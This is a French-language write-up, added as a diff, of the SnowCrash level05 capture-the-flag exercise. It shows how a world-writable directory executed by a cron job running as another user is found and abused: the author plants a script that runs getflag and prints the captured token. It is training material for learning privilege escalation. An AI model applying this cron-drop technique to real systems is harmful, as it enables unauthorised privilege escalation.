@@ -1,0 +1,77 @@
+Sur ce niveau je n'ai aucun fichier mais par contre des que je me connect j'ai un message
+
+    level05@10.14.249.198's password:
+    You have new mail.
+    level05@SnowCrash:~$
+
+J'ai trouver un scripte qui me permet de tester plein de vulnerabilité , je le copie dans la vm 
+et je le lance
+
+    c4r1p6% scp -P 4242 /Users/misaev/Desktop/SnowCrash/level05/ressources/penTest.bash level05@10.14.249.198:/var/crash/myDo
+
+le scripte m'affiche plein vulnerabilité et parmis celle ci une seul attire mon attention
+
+
+    # file: /opt/openarenaserver
+    USER   root      rwx  rwx
+    user   level05   rwx  rwx
+    user   flag05    rwx  rwx
+    GROUP  root      r-x  r-x
+    mask             rwx  rwx
+    other            r-x  r-x
+
+    # file: /usr/sbin/openarenaserver
+    USER   flag05    rwx
+    user   level05   r--
+    GROUP  flag05    r-x
+    mask             r-x
+    other            ---
+
+Je fouille dans ces dossier et le premier dossier ou j'ai le droit d'ecriture et lecture il n'y a rien mais de le deuxieme ou je n'ai que le droit de lecture il y a un scripte sh.
+
+    level05@SnowCrash:/usr/sbin$ cat openarenaserver
+    #!/bin/sh
+
+    for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+    done
+
+Ce scripte quand lancer va aller dans le dossier /opt/openarenaserver/ et va lancer tout les scriptes qui s'y trouve et ensuite va les supprimer.
+Sachant que ce scripte ce lance avec les droits d'execution de flag05 il faudrai que je fasse un scripte bash qui execute la command 'getflag' ensuite exporter son retour dans un dossier accessible a tout les utilisateurs, comme cela il serai lancer via ce scripte et je pourrai recupere le flag pour acceder a l'utilisateur suivant.
+
+    -rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 openarenaserver
+
+Apres cette etape il y a deux facon de faire soit je met un fichier bidon dans le dossiers /opt/openarenaserver/ et je regarde si il disparait apres un certain temps , soit je cherche un dossier,fichier ou autre qui une relation quelconque avec le mail car ces le message que je recois des que je me connecte.
+Le scripte que j'ai lancer me donne une piste interessante 
+
+╔══════════╣ Searching installed mail applications
+
+╔══════════╣ Mails (limit 50)
+ 11098    4 -rw-r--r--   1 root     mail           58 May 17 16:43 /var/mail/level05
+ 11098    4 -rw-r--r--   1 root     mail           58 May 17 16:43 /var/spool/mail/level05
+
+
+je vais aller fouiller dans ces dossier et effectivement 
+
+    level05@SnowCrash:/var/mail$ cat level05
+    */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+ce fichier est un fichier crontab cad que il definie un processus a faire apres x temps dans ce cas precis le scripte openarenaserver est lancer tout les 2 minute.
+
+Je cree un scripte bash
+
+    #!/bin/bash
+
+    output_file="/var/run/shm/flag_output.txt"
+
+    if [[ ! -e "$output_file" ]]; then
+        touch "$output_file"
+    fi
+
+    getflag > "$output_file"
+
+Ce scripte va cree un fichier dans /var/run/shm ,car c est un dossier accessible ou tout les utilisateurs peuvent ecrires et lires, ensuite je vais lancer la commande getflag et stocker sont resultat dans flag_output.txt
+
+    level05@SnowCrash:/var/run/shm$ cat flag_output.txt
+    Check flag.Here is your token : viuaaale9huek52boumoomioc
